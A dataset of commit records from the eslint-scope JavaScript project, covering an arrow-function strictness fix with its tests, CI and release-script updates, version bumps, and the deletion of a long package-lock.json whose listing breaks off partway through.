17,56,56,569,4,26,futpib <futpib@gmail.com>,-1,-1,-1,-1,-1,-1,-1,Fri,3,2,22 Feb 2019,Fix: Arrow function scope strictness (fixes #49) (#50),0,0,2,45,1960,"+        expect(scope.isStrict).to.be.false;<\n>+        expect(scope.isStrict).to.be.false;<\n>+    it(""inherits upper scope strictness""<c> () => {<\n>+        const ast = espree(`<\n>+            ""use strict"";<\n>+            var arrow = () => {};<\n>+        `);<\n>+        const scopeManager = analyze(ast<c> { ecmaVersion: 6 });<\n>+        expect(scopeManager.scopes).to.have.length(2);<\n>+        let scope = scopeManager.scopes[0];<\n>+        expect(scope.type).to.be.equal(""global"");<\n>+        expect(scope.block.type).to.be.equal(""Program"");<\n>+        expect(scope.isStrict).to.be.true;<\n>+        expect(scope.variables).to.have.length(1);<\n>+        scope = scopeManager.scopes[1];<\n>+        expect(scope.type).to.be.equal(""function"");<\n>+        expect(scope.block.type).to.be.equal(""ArrowFunctionExpression"");<\n>+        expect(scope.isStrict).to.be.true;<\n>+        expect(scope.variables).to.have.length(0);<\n>+    });<\n>+    it(""is strict when a strictness directive is used""<c> () => {<\n>+        const ast = espree(`<\n>+            var arrow = () => {<\n>+                ""use strict"";<\n>+            };<\n>+        `);<\n>+        const scopeManager = analyze(ast<c> { ecmaVersion: 6 });<\n>+        expect(scopeManager.scopes).to.have.length(2);<\n>+        let scope = scopeManager.scopes[0];<\n>+        expect(scope.type).to.be.equal(""global"");<\n>+        expect(scope.block.type).to.be.equal(""Program"");<\n>+        expect(scope.isStrict).to.be.false;<\n>+        expect(scope.variables).to.have.length(1);<\n>+        scope = scopeManager.scopes[1];<\n>+        expect(scope.type).to.be.equal(""function"");<\n>+        expect(scope.block.type).to.be.equal(""ArrowFunctionExpression"");<\n>+        expect(scope.isStrict).to.be.true;<\n>+        expect(scope.variables).to.have.length(0);<\n>+    });<\n>",-    // ArrowFunctionExpression's scope is always strict scope.<\n>-    if (block.type === Syntax.ArrowFunctionExpression) {<\n>-        return true;<\n>-    }<\n>-        expect(scope.isStrict).to.be.true;<\n>-        expect(scope.isStrict).to.be.true;<\n>,F
17,56,56,569,4,26,Kai Cataldo,47,4,87,40,User,0,1966,Thu,0,26,8 Nov 2018,Chore: add supported Node.js versions to CI (#47),0,0,1,8,108,"+    - ""8""<\n>+    - ""9""<\n>+    - ""10""<\n>+    - ""11""<\n>+script: ""npm test""<\n>","-    - ""5""<\n>-    - ""7""<\n>-script: ""npm test""<\n>",F
17,56,56,569,4,26,Teddy Katz,75,10,128,0,User,0,1599,Wed,21,9,17 Oct 2018,Upgrade: eslint-release@1.0.0 (#46) (refs https://github.com/eslint/eslint/issues/10631) This updates `eslint-release` to allow the package to still be published from the Jenkins server now that we have 2FA enabled on the bot account. Some changes are also needed on the Jenkins server -- I plan to make those changes after this is merged.,0,0,2,16,670,"+.sublimelinterrc<\n>+.eslint-release-info.json<\n>+    ""generate-release"": ""eslint-generate-release""<c><\n>+    ""generate-alpharelease"": ""eslint-generate-prerelease alpha""<c><\n>+    ""generate-betarelease"": ""eslint-generate-prerelease beta""<c><\n>+    ""generate-rcrelease"": ""eslint-generate-prerelease rc""<c><\n>+    ""publish-release"": ""eslint-publish-release""<\n>+    ""eslint-release"": ""^1.0.0""<c><\n>","-.sublimelinterrc<\n>-    ""release"": ""eslint-release""<c><\n>-    ""ci-release"": ""eslint-ci-release""<c><\n>-    ""gh-release"": ""eslint-gh-release""<c><\n>-    ""alpharelease"": ""eslint-prerelease alpha""<c><\n>-    ""betarelease"": ""eslint-prerelease beta""<c><\n>-    ""rcrelease"": ""eslint-prerelease rc""<\n>-    ""eslint-release"": ""^0.11.1""<c><\n>",F
17,56,56,569,4,26,ESLint Jenkins <eslint@googlegroups.com>,-1,-1,-1,-1,-1,-1,-1,Thu,16,41,21 Jun 2018,4.0.0,0,0,1,2,51,"+  ""version"": ""4.0.0""<c><\n>","-  ""version"": ""4.0.0-rc.0""<c><\n>",F
17,56,56,569,4,26,ESLint Jenkins <eslint@googlegroups.com>,-1,-1,-1,-1,-1,-1,-1,Thu,16,41,21 Jun 2018,Build: changelog update for 4.0.0,0,0,1,1,24,+v4.0.0 - June 21<c> 2018<\n>,,F
17,56,56,569,4,26,ESLint Jenkins <eslint@googlegroups.com>,-1,-1,-1,-1,-1,-1,-1,Sat,11,59,9 Jun 2018,4.0.0-rc.0,0,0,1,2,59,"+  ""version"": ""4.0.0-rc.0""<c><\n>","-  ""version"": ""4.0.0-alpha.0""<c><\n>",F
17,56,56,569,4,26,ESLint Jenkins <eslint@googlegroups.com>,-1,-1,-1,-1,-1,-1,-1,Sat,11,59,9 Jun 2018,Build: changelog update for 4.0.0-rc.0,0,0,1,3,188,+v4.0.0-rc.0 - June 9<c> 2018<\n>+* 3b919b8 Build: Adding rc release script to package.json (#38) (Kevin Partington)<\n>+* 137732a Chore: avoid creating package-lock.json files (#37) (Teddy Katz)<\n>,,F
17,56,56,569,4,26,Kevin Partington,53,3,50,2,User,0,3363,Sat,10,49,9 Jun 2018,Build: Adding rc release script to package.json (#38),0,0,1,3,132,"+    ""betarelease"": ""eslint-prerelease beta""<c><\n>+    ""rcrelease"": ""eslint-prerelease rc""<\n>","-    ""betarelease"": ""eslint-prerelease beta""<\n>",F
17,56,56,569,4,26,Teddy Katz,75,10,128,0,User,0,1599,Fri,21,51,27 Apr 2018,Chore: avoid creating package-lock.json files (#37),1,1,1,2318,79609,+package-lock=false<\n>,"-  ""name"": ""eslint-scope""<c><\n>-  ""version"": ""4.0.0-alpha.0""<c><\n>-  ""lockfileVersion"": 1<c><\n>-  ""requires"": true<c><\n>-  ""dependencies"": {<\n>-    ""abbrev"": {<\n>-      ""version"": ""1.1.1""<c><\n>-      ""resolved"": ""https://registry.npmjs.org/abbrev/-/abbrev-1.1.1.tgz""<c><\n>-      ""integrity"": ""sha512-nne9/IiQ/hzIhY6pdDnbBtz7DjPTKrY00P/zvPSm5pOFkl6xuGrGnXn/VtTNNfNtAfZ9/1RtehkszU9qcTii0Q==""<c><\n>-      ""dev"": true<\n>-    }<c><\n>-    ""acorn"": {<\n>-      ""version"": ""5.5.3""<c><\n>-      ""resolved"": ""https://registry.npmjs.org/acorn/-/acorn-5.5.3.tgz""<c><\n>-      ""integrity"": ""sha512-jd5MkIUlbbmb07nXH0DT3y7rDVtkzDi4XZOUVWAer8ajmF/DTSSbl5oNFyDOl/OXA33Bl79+ypHhl2pN20VeOQ==""<c><\n>-      ""dev"": true<\n>-    }<c><\n>-    ""acorn-jsx"": {<\n>-      ""version"": ""3.0.1""<c><\n>-      ""resolved"": ""https://registry.npmjs.org/acorn-jsx/-/acorn-jsx-3.0.1.tgz""<c><\n>-      ""integrity"": ""sha1-r9+UiPsezvyDSPb7IvRk4ypYs2s=""<c><\n>-      ""dev"": true<c><\n>-      ""requires"": {<\n>-        ""acorn"": ""3.3.0""<\n>-      }<c><\n>-      ""dependencies"": {<\n>-        ""acorn"": {<\n>-          ""version"": ""3.3.0""<c><\n>-          ""resolved"": ""https://registry.npmjs.org/acorn/-/acorn-3.3.0.tgz""<c><\n>-          ""integrity"": ""sha1-ReN/s56No/JbruP/U2niu18iAXo=""<c><\n>-          ""dev"": true<\n>-        }<\n>-      }<\n>-    }<c><\n>-    ""ajv"": {<\n>-      ""version"": ""4.11.8""<c><\n>-      ""resolved"": ""https://registry.npmjs.org/ajv/-/ajv-4.11.8.tgz""<c><\n>-      ""integrity"": ""sha1-gv+wKynmYq5TvcIK8VlHcGc5xTY=""<c><\n>-      ""dev"": true<c><\n>-      ""requires"": {<\n>-        ""co"": ""4.6.0""<c><\n>-        ""json-stable-stringify"": ""1.0.1""<\n>-      }<\n>-    }<c><\n>-    ""ajv-keywords"": {<\n>-      ""version"": ""1.5.1""<c><\n>-      ""resolved"": ""https://registry.npmjs.org/ajv-keywords/-/ajv-keywords-1.5.1.tgz""<c><\n>-      ""integrity"": ""sha1-MU3QpLM2j609/NxU7eYXG4htrzw=""<c><\n>-      ""dev"": true<\n>-    }<c><\n>-    ""align-text"": {<\n>-      ""version"": ""0.1.4""<c><\n>-      ""resolved"": ""https://registry.npmjs.org/align-text/-/align-text-0.1.4.tgz""<c><\n>-      ""integrity"": ""sha1-DNkKVhCT810KmSVsIrcGlDP60Rc=""<c><\n>-      ""dev"": true<c><\n>-      ""requires"": {<\n>-        ""kind-of"": ""3.2.2""<c><\n>-        ""longest"": ""1.0.1""<c><\n>-        ""repeat-string"": ""1.6.1""<\n>-      }<\n>-    }<c><\n>-    ""amdefine"": {<\n>-      ""version"": ""1.0.1""<c><\n>-      ""resolved"": ""https://registry.npmjs.org/amdefine/-/amdefine-1.0.1.tgz""<c><\n>-      ""integrity"": ""sha1-SlKCrBZHKek2Gbz9OtFR+BfOkfU=""<c><\n>-      ""dev"": true<\n>-    }<c><\n>-    ""ansi-escapes"": {<\n>-      ""version"": ""1.4.0""<c><\n>-      ""resolved"": ""https://registry.npmjs.org/ansi-escapes/-/ansi-escapes-1.4.0.tgz""<c><\n>-      ""integrity"": ""sha1-06ioOzGapneTZisT52HHkRQiMG4=""<c><\n>-      ""dev"": true<\n>-    }<c><\n>-    ""ansi-regex"": {<\n>-      ""version"": ""2.1.1""<c><\n>-      ""resolved"": ""https://registry.npmjs.org/ansi-regex/-/ansi-regex-2.1.1.tgz""<c><\n>-      ""integrity"": ""sha1-w7M6te42DYbg5ijwRorn7yfWVN8=""<c><\n>-      ""dev"": true<\n>-    }<c><\n>-    ""ansi-styles"": {<\n>-      ""version"": ""2.2.1""<c><\n>-      ""resolved"": ""https://registry.npmjs.org/ansi-styles/-/ansi-styles-2.2.1.tgz""<c><\n>-      ""integrity"": ""sha1-tDLdM1i2NM914eRmQ2gkBTPB3b4=""<c><\n>-      ""dev"": true<\n>-    }<c><\n>-    ""argparse"": {<\n>-      ""version"": ""1.0.10""<c><\n>-      ""resolved"": ""https://registry.npmjs.org/argparse/-/argparse-1.0.10.tgz""<c><\n>-      ""integrity"": ""sha512-o5Roy6tNG4SL/FOkCAN6RzjiakZS25RLYFrcMttJqbdd8BWrnA+fGz57iN5Pb06pvBGvl5gQ0B48dJlslXvoTg==""<c><\n>-      ""dev"": true<c><\n>-      ""requires"": {<\n>-        ""sprintf-js"": ""1.0.3""<\n>-      }<\n>-    }<c><\n>-    ""array-find-index"": {<\n>-      ""version"": ""1.0.2""<c><\n>-      ""resolved"": ""https://registry.npmjs.org/array-find-index/-/array-find-index-1.0.2.tgz""<c><\n>-      ""integrity"": ""sha1-3wEKoSh+Fku9pvlyOwqWoexBh6E=""<c><\n>-      ""dev"": true<\n>-    }<c><\n>-    ""array-union"": {<\n>-      ""version"": ""1.0.2""<c><\n>-      ""resolved"": ""https://registry.npmjs.org/array-union/-/array-union-1.0.2.tgz""<c><\n>-      ""integrity"": ""sha1-mjRBDk9OPaI96jdb5b5w8kd47Dk=""<c><\n>-      ""dev"": true<c><\n>-      ""requires"": {<\n>-        ""array-uniq"": ""1.0.3""<\n>-      }<\n>-    }<c><\n>-    ""array-uniq"": {<\n>-      ""version"": ""1.0.3""<c><\n>-      ""resolved"": ""https://registry.npmjs.org/array-uniq/-/array-uniq-1.0.3.tgz""<c><\n>-      ""integrity"": ""sha1-r2rId6Jcx/dOBYiUdThY39sk/bY=""<c><\n>-      ""dev"": true<\n>-    }<c><\n>-    ""arrify"": {<\n>-      ""version"": ""1.0.1""<c><\n>-      ""resolved"": ""https://registry.npmjs.org/arrify/-/arrify-1.0.1.tgz""<c><\n>-      ""integrity"": ""sha1-iYUI2iIm84DfkEcoRWhJwVAaSw0=""<c><\n>-      ""dev"": true<\n>-    }<c><\n>-    ""asap"": {<\n>-      ""version"": ""2.0.6""<c><\n>-      ""resolved"": ""https://registry.npmjs.org/asap/-/asap-2.0.6.tgz""<c><\n>-      ""integrity"": ""sha1-5QNHYR1+aQlDIIu9r+vLwvuGbUY=""<c><\n>-      ""dev"": true<\n>-    }<c><\n>-    ""assertion-error"": {<\n>-      ""version"": ""1.1.0""<c><\n>-      ""resolved"": ""https://registry.npmjs.org/assertion-error/-/assertion-error-1.1.0.tgz""<c><\n>-      ""integrity"": ""sha512-jgsaNduz+ndvGyFt3uSuWqvy4lCnIJiovtouQN5JZHOKCS2QuhEdbcQHFhVksz2N2U9hXJo8odG7ETyWlEeuDw==""<c><\n>-      ""dev"": true<\n>-    }<c><\n>-    ""async"": {<\n>-      ""version"": ""1.5.2""<c><\n>-      ""resolved"": ""https://registry.npmjs.org/async/-/async-1.5.2.tgz""<c><\n>-      ""integrity"": ""sha1-7GphrlZIDAw8skHJVhjiCJL5Zyo=""<c><\n>-      ""dev"": true<\n>-    }<c><\n>-    ""axios"": {<\n>-      ""version"": ""0.10.0""<c><\n>-      ""resolved"": ""https://registry.npmjs.org/axios/-/axios-0.10.0.tgz""<c><\n>-      ""integrity"": ""sha1-Ww7A1ftT55uYt7+EwOmxz5Av38Q=""<c><\n>-      ""dev"": true<c><\n>-      ""requires"": {<\n>-        ""follow-redirects"": ""0.0.7""<\n>-      }<\n>-    }<c><\n>-    ""babel-code-frame"": {<\n>-      ""version"": ""6.26.0""<c><\n>-      ""resolved"": ""https://registry.npmjs.org/babel-code-frame/-/babel-code-frame-6.26.0.tgz""<c><\n>-      ""integrity"": ""sha1-Y/1D99weO7fONZR9uP42mj9Yx0s=""<c><\n>-      ""dev"": true<c><\n>-      ""requires"": {<\n>-        ""chalk"": ""1.1.3""<c><\n>-        ""esutils"": ""2.0.2""<c><\n>-        ""js-tokens"": ""3.0.2""<\n>-      }<\n>-    }<c><\n>-    ""balanced-match"": {<\n>-      ""version"": ""1.0.0""<c><\n>-      ""resolved"": ""https://registry.npmjs.org/balanced-match/-/balanced-match-1.0.0.tgz""<c><\n>-      ""integrity"": ""sha1-ibTRmasr7kneFk6gK4nORi1xt2c=""<c><\n>-      ""dev"": true<\n>-    }<c><\n>-    ""brace-expansion"": {<\n>-      ""version"": ""1.1.11""<c><\n>-      ""resolved"": ""https://registry.npmjs.org/brace-expansion/-/brace-expansion-1.1.11.tgz""<c><\n>-      ""integrity"": ""sha512-iCuPHDFgrHX7H2vEI/5xpz07zSHB00TpugqhmYtVmMO6518mCuRMoOYFldEBl0g187ufozdaHgWKcYFb61qGiA==""<c><\n>-      ""dev"": true<c><\n>-      ""requires"": {<\n>-        ""balanced-match"": ""1.0.0""<c><\n>-        ""concat-map"": ""0.0.1""<\n>-      }<\n>-    }<c><\n>-    ""browser-stdout"": {<\n>-      ""version"": ""1.3.0""<c><\n>-      ""resolved"": ""https://registry.npmjs.org/browser-stdout/-/browser-stdout-1.3.0.tgz""<c><\n>-      ""integrity"": ""sha1-81HTKWnTL6XXpVZxVCY9korjvR8=""<c><\n>-      ""dev"": true<\n>-    }<c><\n>-    ""buffer-from"": {<\n>-      ""version"": ""1.0.0""<c><\n>-      ""resolved"": ""https://registry.npmjs.org/buffer-from/-/buffer-from-1.0.0.tgz""<c><\n>-      ""integrity"": ""sha512-83apNb8KK0Se60UE1+4Ukbe3HbfELJ6UlI4ldtOGs7So4KD26orJM8hIY9lxdzP+UpItH1Yh/Y8GUvNFWFFRxA==""<c><\n>-      ""dev"": true<\n>-    }<c><\n>-    ""builtin-modules"": {<\n>-      ""version"": ""1.1.1""<c><\n>-      ""resolved"": ""https://registry.npmjs.org/builtin-modules/-/builtin-modules-1.1.1.tgz""<c><\n>-      ""integrity"": ""sha1-Jw8HbFpywC9bZaR9+Uxf46J4iS8=""<c><\n>-      ""dev"": true<\n>-    }<c><\n>-    ""caller-path"": {<\n>-      ""version"": ""0.1.0""<c><\n>-      ""resolved"": ""https://registry.npmjs.org/caller-path/-/caller-path-0.1.0.tgz""<c><\n>-      ""integrity"": ""sha1-lAhe9jWB7NPaqSREqP6U6CV3dR8=""<c><\n>-      ""dev"": true<c><\n>-      ""requires"": {<\n>-        ""callsites"": ""0.2.0""<\n>-      }<\n>-    }<c><\n>-    ""callsites"": {<\n>-      ""version"": ""0.2.0""<c><\n>-      ""resolved"": ""https://registry.npmjs.org/callsites/-/callsites-0.2.0.tgz""<c><\n>-      ""integrity"": ""sha1-r6uWJikQp/M8GaV3WCXGnzTjUMo=""<c><\n>-      ""dev"": true<\n>-    }<c><\n>-    ""camelcase"": {<\n>-      ""version"": ""2.1.1""<c><\n>-      ""resolved"": ""https://registry.npmjs.org/camelcase/-/camelcase-2.1.1.tgz""<c><\n>-      ""integrity"": ""sha1-fB0W1nmhu+WcoCys7PsBHiAfWh8=""<c><\n>-      ""dev"": true<\n>-    }<c><\n>-    ""camelcase-keys"": {<\n>-      ""version"": ""2.1.0""<c><\n>-      ""resolved"": ""https://registry.npmjs.org/camelcase-keys/-/camelcase-keys-2.1.0.tgz""<c><\n>-      ""integrity"": ""sha1-MIvur/3ygRkFHvodkyITyRuPkuc=""<c><\n>-      ""dev"": true<c><\n>-      ""requires"": {<\n>-        ""camelcase"": ""2.1.1""<c><\n>-        ""map-obj"": ""1.0.1""<\n>-      }<\n>-    }<c><\n>-    ""center-align"": {<\n>-      ""version"": ""0.1.3""<c><\n>-      ""resolved"": ""https://registry.npmjs.org/center-align/-/center-align-0.1.3.tgz""<c><\n>-      ""integrity"": ""sha1-qg0yYptu6XIgBBHL1EYckHvCt60=""<c><\n>-      ""dev"": true<c><\n>-      ""optional"": true<c><\n>-      ""requires"": {<\n>-        ""align-text"": ""0.1.4""<c><\n>-        ""lazy-cache"": ""1.0.4""<\n>-      }<\n>-    }<c><\n>-    ""chai"": {<\n>-      ""version"": ""3.5.0""<c><\n>-      ""resolved"": ""https://registry.npmjs.org/chai/-/chai-3.5.0.tgz""<c><\n>-      ""integrity"": ""sha1-TQJjewZ/6Vi9v906QOxW/vc3Mkc=""<c><\n>-      ""dev"": true<c><\n>-      ""requires"": {<\n>-        ""assertion-error"": ""1.1.0""<c><\n>-        ""deep-eql"": ""0.1.3""<c><\n>-        ""type-detect"": ""1.0.0""<\n>-      }<\n>-    }<c><\n>-    ""chalk"": {<\n>-      ""version"": ""1.1.3""<c><\n>-      ""resolved"": ""https://registry.npmjs.org/chalk/-/chalk-1.1.3.tgz""<c><\n>-      ""integrity"": ""sha1-qBFcVeSnAv5NFQq9OHKCKn4J/Jg=""<c><\n>-      ""dev"": true<c><\n>-      ""requires"": {<\n>-        ""ansi-styles"": ""2.2.1""<c><\n>-        ""escape-string-regexp"": ""1.0.5""<c><\n>-        ""has-ansi"": ""2.0.0""<c><\n>-        ""strip-ansi"": ""3.0.1""<c><\n>-        ""supports-color"": ""2.0.0""<\n>-      }<\n>-    }<c><\n>-    ""circular-json"": {<\n>-      ""version"": ""0.3.3""<c><\n>-      ""resolved"": ""https://registry.npmjs.org/circular-json/-/circular-json-0.3.3.tgz""<c><\n>-      ""integrity"": ""sha512-UZK3NBx2Mca+b5LsG7bY183pHWt5Y1xts4P3Pz7ENTwGVnJOUWbRb3ocjvX7hx9tq/yTAdclXm9sZ38gNuem4A==""<c><\n>-      ""dev"": true<\n>-    }<c><\n>-    ""cli-cursor"": {<\n>-      ""version"": ""1.0.2""<c><\n>-      ""resolved"": ""https://registry.npmjs.org/cli-cursor/-/cli-cursor-1.0.2.tgz""<c><\n>-      ""integrity"": ""sha1-ZNo/fValRBLll5S9Ytw1KV6PKYc=""<c><\n>-      ""dev"": true<c><\n>-      ""requires"": {<\n>-        ""restore-cursor"": ""1.0.1""<\n>-      }<\n>-    }<c><\n>-    ""cli-width"": {<\n>-      ""version"": ""2.2.0""<c><\n>-      ""resolved"": ""https://registry.npmjs.org/cli-width/-/cli-width-2.2.0.tgz""<c><\n>-      ""integrity"": ""sha1-/xnt6Kml5XkyQUewwR8PvLq+1jk=""<c><\n>-      ""dev"": true<\n>-    }<c><\n>-    ""cliui"": {<\n>-      ""version"": ""2.1.0""<c><\n>-      ""resolved"": ""https://registry.npmjs.org/cliui/-/cliui-2.1.0.tgz""<c><\n>-      ""integrity"": ""sha1-S0dXYP+AJkx2LDoXGQMukcf+oNE=""<c><\n>-      ""dev"": true<c><\n>-      ""optional"": true<c><\n>-      ""requires"": {<\n>-        ""center-align"": ""0.1.3""<c><\n>-        ""right-align"": ""0.1.3""<c><\n>-        ""wordwrap"": ""0.0.2""<\n>-      }<c><\n>-      ""dependencies"": {<\n>-        ""wordwrap"": {<\n>-          ""version"": ""0.0.2""<c><\n>-          ""resolved"": ""https://registry.npmjs.org/wordwrap/-/wordwrap-0.0.2.tgz""<c><\n>-          ""integrity"": ""sha1-t5Zpu0LstAn4PVg8rVLKF+qhZD8=""<c><\n>-          ""dev"": true<c><\n>-          ""optional"": true<\n>-        }<\n>-      }<\n>-    }<c><\n>-    ""co"": {<\n>-      ""version"": ""4.6.0""<c><\n>-      ""resolved"": ""https://registry.npmjs.org/co/-/co-4.6.0.tgz""<c><\n>-      ""integrity"": ""sha1-bqa989hTrlTMuOR7+gvz+QMfsYQ=""<c><\n>-      ""dev"": true<\n>-    }<c><\n>-    ""code-point-at"": {<\n>-      ""version"": ""1.1.0""<c><\n>-      ""resolved"": ""https://registry.npmjs.org/code-point-at/-/code-point-at-1.1.0.tgz""<c><\n>-      ""integrity"": ""sha1-DQcLTQQ6W+ozovGkDi7bPZpMz3c=""<c><\n>-      ""dev"": true<\n>-    }<c><\n>-    ""commander"": {<\n>-      ""version"": ""2.9.0""<c><\n>-      ""resolved"": ""https://registry.npmjs.org/commander/-/commander-2.9.0.tgz""<c><\n>-      ""integrity"": ""sha1-nJkJQXbhIkDLItbFFGCYQA/g99Q=""<c><\n>-      ""dev"": true<c><\n>-      ""requires"": {<\n>-        ""graceful-readlink"": ""1.0.1""<\n>-      }<\n>-    }<c><\n>-    ""concat-map"": {<\n>-      ""version"": ""0.0.1""<c><\n>-      ""resolved"": ""https://registry.npmjs.org/concat-map/-/concat-map-0.0.1.tgz""<c><\n>-      ""integrity"": ""sha1-2Klr13/Wjfd5OnMDajug1UBdR3s=""<c><\n>-      ""dev"": true<\n>-    }<c><\n>-    ""concat-stream"": {<\n>-      ""version"": ""1.6.2""<c><\n>-      ""resolved"": ""https://registry.npmjs.org/concat-stream/-/concat-stream-1.6.2.tgz""<c><\n>-      ""integrity"": ""sha512-27HBghJxjiZtIk3Ycvn/4kbJk/1uZuJFfuPEns6LaEvpvG1f0hTea8lilrouyo9mVc2GWdcEZ8OLoGmSADlrCw==""<c><\n>-      ""dev"": true<c><\n>-      ""requires"": {<\n>-        ""buffer-from"": ""1.0.0""<c><\n>-        ""inherits"": ""2.0.3""<c><\n>-        ""readable-stream"": ""2.3.6""<c><\n>-        ""typedarray"": ""0.0.6""<\n>-      }<\n>-    }<c><\n>-    ""core-util-is"": {<\n>-      ""version"": ""1.0.2""<c><\n>-      ""resolved"": ""https://registry.npmjs.org/core-util-is/-/core-util-is-1.0.2.tgz""<c><\n>-      ""integrity"": ""sha1-tf1UIgqivFq1eqtxQMlAdUUDwac=""<c><\n>-      ""dev"": true<\n>-    }<c><\n>-    ""currently-unhandled"": {<\n>-      ""version"": ""0.4.1""<c><\n>-      ""resolved"": ""https://registry.npmjs.org/currently-unhandled/-/currently-unhandled-0.4.1.tgz""<c><\n>-      ""integrity"": ""sha1-mI3zP+qxke95mmE2nddsF635V+o=""<c><\n>-      ""dev"": true<c><\n>-      ""requires"": {<\n>-        ""array-find-index"": ""1.0.2""<\n>-      }<\n>-    }<c><\n>-    ""d"": {<\n>-      ""version"": ""1.0.0""<c><\n>-      ""resolved"": ""https://registry.npmjs.org/d/-/d-1.0.0.tgz""<c><\n>-      ""integrity"": ""sha1-dUu1v+VUUdpppYuU1F9MWwRi1Y8=""<c><\n>-      ""dev"": true<c><\n>-      ""requires"": {<\n>-        ""es5-ext"": ""0.10.42""<\n>-      }<\n>-    }<c><\n>-    ""dateformat"": {<\n>-      ""version"": ""1.0.12""<c><\n>-      ""resolved"": ""https://registry.npmjs.org/dateformat/-/dateformat-1.0.12.tgz""<c><\n>-      ""integrity"": ""sha1-nxJLZ1lMk3/3BpMuSmQsyo27/uk=""<c><\n>-      ""dev"": true<c><\n>-      ""requires"": {<\n>-        ""get-stdin"": ""4.0.1""<c><\n>-        ""meow"": ""3.7.0""<\n>-      }<\n>-    }<c><\n>-    ""debug"": {<\n>-      ""version"": ""2.6.9""<c><\n>-      ""resolved"": ""https://registry.npmjs.org/debug/-/debug-2.6.9.tgz""<c><\n>-      ""integrity"": ""sha512-bC7ElrdJaJnPbAP+1EotYvqZsb3ecl5wi6Bfi6BJTUcNowp6cvspg0jXznRTKDjm/E7AdgFBVeAPVMNcKGsHMA==""<c><\n>-      ""dev"": true<c><\n>-      ""requires"": {<\n>-        ""ms"": ""2.0.0""<\n>-      }<\n>-    }<c><\n>-    ""debuglog"": {<\n>-      ""version"": ""1.0.1""<c><\n>-      ""resolved"": ""https://registry.npmjs.org/debuglog/-/debuglog-1.0.1.tgz""<c><\n>-      ""integrity"": ""sha1-qiT/uaw9+aI1GDfPstJ5NgzXhJI=""<c><\n>-      ""dev"": true<\n>-    }<c><\n>-    ""decamelize"": {<\n>-      ""version"": ""1.2.0""<c><\n>-      ""resolved"": ""https://registry.npmjs.org/decamelize/-/decamelize-1.2.0.tgz""<c><\n>-      ""integrity"": ""sha1-9lNNFRSCabIDUue+4m9QH5oZEpA=""<c><\n>-      ""dev"": true<\n>-    }<c><\n>-    ""deep-eql"": {<\n>-      ""version"": ""0.1.3""<c><\n>-      ""resolved"": ""https://registry.npmjs.org/deep-eql/-/deep-eql-0.1.3.tgz""<c><\n>-      ""integrity"": ""sha1-71WKyrjeJSBs1xOQbXTlaTDrafI=""<c><\n>-      ""dev"": true<c><\n>-      ""requires"": {<\n>-        ""type-detect"": ""0.1.1""<\n>-      }<c><\n>-      ""dependencies"": {<\n>-        ""type-detect"": {<\n>-          ""version"": ""0.1.1""<c><\n>-          ""resolved"": ""https://registry.npmjs.org/type-detect/-/type-detect-0.1.1.tgz""<c><\n>-          ""integrity"": ""sha1-C6XsKohWQORw6k6FBZcZANrFiCI=""<c><\n>-          ""dev"": true<\n>-        }<\n>-      }<\n>-    }<c><\n>-    ""deep-is"": {<\n>-      ""version"": ""0.1.3""<c><\n>-      ""resolved"": ""https://registry.npmjs.org/deep-is/-/deep-is-0.1.3.tgz""<c><\n>-      ""integrity"": ""sha1-s2nW+128E+7PUk+RsHD+7cNXzzQ=""<c><\n>-      ""dev"": true<\n>-    }<c><\n>-    ""del"": {<\n>-      ""version"": ""2.2.2""<c><\n>-      ""resolved"": ""https://registry.npmjs.org/del/-/del-2.2.2.tgz""<c><\n>-      ""integrity"": ""sha1-wSyYHQZ4RshLyvhiz/kw2Qf/0ag=""<c><\n>-      ""dev"": true<c><\n>-      ""requires"": {<\n>-        ""globby"": ""5.0.0""<c><\n>-        ""is-path-cwd"": ""1.0.0""<c><\n>-        ""is-path-in-cwd"": ""1.0.1""<c><\n>-        ""object-assign"": ""4.1.1""<c><\n>-        ""pify"": ""2.3.0""<c><\n>-        ""pinkie-promise"": ""2.0.1""<c><\n>-        ""rimraf"": ""2.6.2""<\n>-      }<\n>-    }<c><\n>-    ""dezalgo"": {<\n>-      ""version"": ""1.0.3""<c><\n>-      ""resolved"": ""https://registry.npmjs.org/dezalgo/-/dezalgo-1.0.3.tgz""<c><\n>-      ""integrity"": ""sha1-f3Qt4Gb8dIvI24IFad3c5Jvw1FY=""<c><\n>-      ""dev"": true<c><\n>-      ""requires"": {<\n>-        ""asap"": ""2.0.6""<c><\n>-        ""wrappy"": ""1.0.2""<\n>-      }<\n>-    }<c><\n>-    ""diff"": {<\n>-      ""version"": ""3.2.0""<c><\n>-      ""resolved"": ""https://registry.npmjs.org/diff/-/diff-3.2.0.tgz""<c><\n>-      ""integrity"": ""sha1-yc45Okt8vQsFinJck98pkCeGj/k=""<c><\n>-      ""dev"": true<\n>-    }<c><\n>-    ""doctrine"": {<\n>-      ""version"": ""2.1.0""<c><\n>-      ""resolved"": ""https://registry.npmjs.org/doctrine/-/doctrine-2.1.0.tgz""<c><\n>-      ""integrity"": ""sha512-35mSku4ZXK0vfCuHEDAwt55dg2jNajHZ1odvF+8SSr82EsZY4QmXfuWso8oEd8zRhVObSN18aM0CjSdoBX7zIw==""<c><\n>-      ""dev"": true<c><\n>-      ""requires"": {<\n>-        ""esutils"": ""2.0.2""<\n>-      }<\n>-    }<c><\n>-    ""error-ex"": {<\n>-      ""version"": ""1.3.1""<c><\n>-      ""resolved"": ""https://registry.npmjs.org/error-ex/-/error-ex-1.3.1.tgz""<c><\n>-      ""integrity"": ""sha1-+FWobOYa3E6GIcPNoh56dhLDqNw=""<c><\n>-      ""dev"": true<c><\n>-      ""requires"": {<\n>-        ""is-arrayish"": ""0.2.1""<\n>-      }<\n>-    }<c><\n>-    ""es5-ext"": {<\n>-      ""version"": ""0.10.42""<c><\n>-      ""resolved"": ""https://registry.npmjs.org/es5-ext/-/es5-ext-0.10.42.tgz""<c><\n>-      ""integrity"": ""sha512-AJxO1rmPe1bDEfSR6TJ/FgMFYuTBhR5R57KW58iCkYACMyFbrkqVyzXSurYoScDGvgyMpk7uRF/lPUPPTmsRSA==""<c><\n>-      ""dev"": true<c><\n>-      ""requires"": {<\n>-        ""es6-iterator"": ""2.0.3""<c><\n>-        ""es6-symbol"": ""3.1.1""<c><\n>-        ""next-tick"": ""1.0.0""<\n>-      }<\n>-    }<c><\n>-    ""es6-iterator"": {<\n>-      ""version"": ""2.0.3""<c><\n>-      ""resolved"": ""https://registry.npmjs.org/es6-iterator/-/es6-iterator-2.0.3.tgz""<c><\n>-      ""integrity"": ""sha1-p96IkUGgWpSwhUQDstCg+/qY87c=""<c><\n>-      ""dev"": true<c><\n>-      ""requires"": {<\n>-        ""d"": ""1.0.0""<c><\n>-        